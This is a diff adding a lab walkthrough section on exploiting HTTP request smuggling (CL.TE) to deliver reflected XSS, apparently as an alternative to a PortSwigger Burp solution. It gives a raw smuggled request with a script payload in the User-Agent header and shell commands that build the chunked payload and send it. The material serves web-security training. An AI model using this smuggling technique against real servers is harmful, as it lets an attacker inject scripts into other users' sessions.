@@ -369,4 +369,53 @@ cat smuggle_delete | httpclient https://$LAB_URL
 cat smuggle_delete | httpclient -L -v https://$LAB_URL #twice
 ```
 
+## Exploiting HTTP request smuggling to deliver reflected XSS (CL.TE)
+
+The following example is an alternative to PortSwigger Burp solution for their [lab]([https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)).
+
+We know that:
+* front-end server doesn't support chunked encoding
+* there is a reflected xss via the `User-Agent` header in the page `/post?postId=3`
+* At each POST request, the bot will make a request (POST with http smuggling => deliver your payload to the boat)
+
+We will smuggle request containing the "XSS reflected request":
+```shell
+POST / HTTP/1.1
+Host: [LAB_URL]
+Content-Length: 75
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked  # <----- use by backend-end
+
+0 <----- end of request for the back-end
+
+GET /post?postId=3 HTTP/1.1   <----- 2nd request for back-end
+User-Agent:"><script>alert(1)</script> # <----- end of request for the front-end
+```
+
+To construct this request:
+
+**1.** construct the "XSS reflected request"::
+```shell
+httpecho -d xss
+curl 'http://localhost:8888/post?postId=3' -H "Host:" -H 'User-Agent:"><script>alert(1)</script>'  -H 'Accept:'
+```
+
+**2.** Smuggle it within legit request:
+```shell
+printf "0\r\n\r\n$(cat xss)" > xss_payload
+httpecho -d tmp_smuggle_xss
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' --data-binary "@xss_payload"
+cat tmp_smuggle_xss | httpoverride --chunked > smuggle_xss
+```
+
+**3.** Check request treatment by back-end:
+```shell
+cat smuggle_xss | httpcustomhouse -cl | httpcustomhouse -te -r
+```
+
+**4.** Send it
+```shell
+cat smuggle_xss | httpclient https://$LAB_URL
+```
+
 
